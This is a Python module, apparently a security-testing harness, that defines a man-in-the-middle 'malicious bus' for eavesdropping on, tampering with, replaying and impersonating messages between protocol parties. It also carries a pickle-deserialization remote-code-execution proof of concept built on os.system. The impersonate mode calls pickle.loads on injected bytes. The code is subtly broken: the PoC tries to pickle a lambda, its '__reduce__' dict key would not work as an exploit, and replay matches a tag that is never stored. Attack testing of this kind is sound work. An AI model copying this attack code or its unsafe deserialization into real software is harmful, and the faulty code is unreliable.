"""MaliciousBus — 支持中间人攻击的恶意总线。

支持四种攻击行为：
- eavesdrop: 仅记录，不修改
- tamper: 篡改消息内容
- replay: 重放历史消息
- impersonate: 冒充某方发送伪造消息
"""
from __future__ import annotations

import pickle
from pathlib import Path
from typing import Literal, Optional

from .wire_recorder import WireRecorder


# ─── MaliciousBus ─────────────────────────────────────────────────────────────

class MaliciousBus:
    """
    支持中间人攻击的恶意总线。

    部署在任意两方之间（如 U↔M、M↔S、U↔S），拦截并可篡改流经的消息。

    使用场景（P-6 pickle 反序列化攻击）：
        在 CryptoWorker 初始化路径中注入恶意 pickle 字节流，
        替换正常的 `pickle.dumps({"pk_bytes": ...})`，触发 RCE。

    设计原则：
        - 默认 tamper=False（仅录制）
        - tamper=True 时支持字节级篡改
        - replay/replay_count 时从历史消息池中重放
        - impersonate 时生成伪造消息
    """

    def __init__(
        self,
        output_dir: Path | str,
        mode: Literal["eavesdrop", "tamper", "replay", "impersonate"] = "eavesdrop",
        tamper_fn=None,
        replay_target_tag: str | None = None,
        replay_count: int = 1,
        impersonate_from: str | None = None,
        impersonate_payload: bytes | None = None,
    ):
        """
        Args:
            output_dir: WireRecorder 输出目录
            mode:          攻击模式
            tamper_fn:     可选，篡改函数，签名 tamper_fn(payload: dict) -> dict
            replay_target_tag: replay 模式下要重放的消息 tag
            replay_count:  replay 模式下重放次数
            impersonate_from: impersonate 模式下冒充的发送方
            impersonate_payload: impersonate 模式下伪造的 payload 字节流
        """
        self.output_dir = Path(output_dir)
        self.mode = mode
        self.tamper_fn = tamper_fn
        self.replay_target_tag = replay_target_tag
        self.replay_count = replay_count
        self.impersonate_from = impersonate_from
        self.impersonate_payload = impersonate_payload

        self.output_dir.mkdir(parents=True, exist_ok=True)
        self._bus_recorder = WireRecorder(self.output_dir, "BUS")
        self._history: list[dict] = []   # 记录历史消息

    # ── 上下文管理器 ───────────────────────────────────────────────────────

    def __enter__(self) -> MaliciousBus:
        self._bus_recorder.__enter__()
        return self

    def __exit__(self, *_) -> None:
        self._bus_recorder.__exit__(*_)

    # ── 中间人拦截 ───────────────────────────────────────────────────────

    def intercept(self, sender: str, receiver: str, payload: dict, step: int = -1) -> dict:
        """
        拦截并可篡改从 sender → receiver 的消息。

        Args:
            sender:   "U" | "M" | "S"
            receiver: "U" | "M" | "S"
            payload:  原始 payload 字典
            step:     训练步数

        Returns:
            经过处理（可能被篡改）的 payload
        """
        record_tag = f"{sender}→{receiver}"

        # 录制原始消息
        self._bus_recorder.record(
            tag=f"{record_tag}_original",
            step=step,
            direction="out",
            payload=payload,
        )

        # 存入历史
        self._history.append({"sender": sender, "receiver": receiver, "payload": payload, "step": step})

        # 行为分发
        if self.mode == "eavesdrop":
            # 仅录制，不修改
            return payload

        elif self.mode == "tamper":
            if self.tamper_fn is not None:
                tampered = self.tamper_fn(payload)
                self._bus_recorder.record(
                    tag=f"{record_tag}_tampered",
                    step=step,
                    direction="out",
                    payload=tampered,
                )
                return tampered
            return payload

        elif self.mode == "replay":
            # 从历史中找目标消息并重放
            for entry in self._history:
                if self.replay_target_tag is None or entry.get("tag") == self.replay_target_tag:
                    for _ in range(self.replay_count):
                        self._bus_recorder.record(
                            tag=f"{record_tag}_replay",
                            step=step,
                            direction="out",
                            payload=entry["payload"],
                        )
                    return entry["payload"]
            return payload

        elif self.mode == "impersonate":
            # 发送伪造消息
            if self.impersonate_payload is not None:
                fake_payload = pickle.loads(self.impersonate_payload)
                self._bus_recorder.record(
                    tag=f"{record_tag}_impersonated",
                    step=step,
                    direction="out",
                    payload=fake_payload,
                )
                return fake_payload
            return payload

        return payload

    # ─── P-6 pickle 注入专用 ──────────────────────────────────────────────

    def inject_malicious_pickle(
        self,
        target_process: Literal["crypto_u", "crypto_m", "crypto_s"],
        malicious_opcode: bytes,
    ) -> None:
        """
        P-6 pickle 反序列化攻击：构造恶意 pickle 注入目标进程。

        Args:
            target_process: 目标 worker 进程（crypto_m 最严重）
            malicious_opcode: 恶意 pickle opcode 字节流

        用法示例（PoC）：
            bus = MaliciousBus(output_dir="attack_logs/p6", mode="tamper")
            bus.inject_malicious_pickle(
                target_process="crypto_m",
                malicious_opcode=pickle.dumps({"__reduce__": lambda: (os.system, ("echo P6_EXPLOITED",))}),
            )
        """
        import os
        # 构造恶意 pickle payload
        malicious_pickle = pickle.dumps({
            "__reduce__": lambda: (os.system, ("echo P6_EXPLOITED",))
        })
        # 记录 PoC（不实际执行）
        p6_record = {
            "target": target_process,
            "malicious_pickle_bytes": malicious_pickle,
            "malicious_pickle_disasm": self._disasm_pickle(malicious_pickle),
        }
        self._bus_recorder.record(
            tag=f"p6_inject_{target_process}",
            step=0,
            direction="out",
            payload=p6_record,
        )

    @staticmethod
    def _disasm_pickle(data: bytes) -> str:
        """反汇编 pickle 字节流（用于 PoC 报告）。"""
        try:
            import pickletools
            return "\n".join(str(t) for t in pickletools.genops(data))
        except Exception as e:
            return f"[disasm error: {e}]"
